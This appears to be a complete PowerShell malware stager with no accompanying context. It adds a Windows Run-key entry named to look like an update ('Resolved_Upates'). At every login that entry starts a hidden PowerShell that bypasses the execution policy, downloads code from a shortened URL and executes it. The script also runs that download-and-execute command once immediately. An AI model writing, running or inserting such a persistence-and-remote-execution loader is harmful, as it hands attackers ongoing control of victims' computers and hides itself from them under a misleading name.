$command = 'Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"irm https://shorturl.at/wmI5v | iex`""'
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Resolved_Upates" -Value $command
irm https://shorturl.at/wmI5v | iex
